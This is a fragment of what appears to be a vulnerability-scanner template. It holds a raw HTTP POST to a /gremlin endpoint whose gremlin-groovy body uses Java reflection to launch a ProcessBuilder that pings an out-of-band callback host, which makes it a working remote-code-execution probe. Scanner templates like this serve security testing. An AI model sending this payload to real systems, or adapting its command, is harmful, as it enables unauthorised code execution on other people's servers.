    type: dsl
  raw:
  - 'POST /gremlin HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"gremlin": "Thread thread = Thread.currentThread();Class clz = Class.forName(\"java.lang.Thread\");java.lang.reflect.Field
    field = clz.getDeclaredField(\"name\");field.setAccessible(true);field.set(thread,
    \"SL7\");Class processBuilderClass = Class.forName(\"java.lang.ProcessBuilder\");java.lang.reflect.Constructor
    constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List
    command = java.util.Arrays.asList(\"ping\", \"{{interactsh-url}}\");Object processBuilderInstance
    = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\"start\");startMethod.invoke(processBuilderInstance);",
    "bindings": {}, "language": "gremlin-groovy", "aliases": {}}

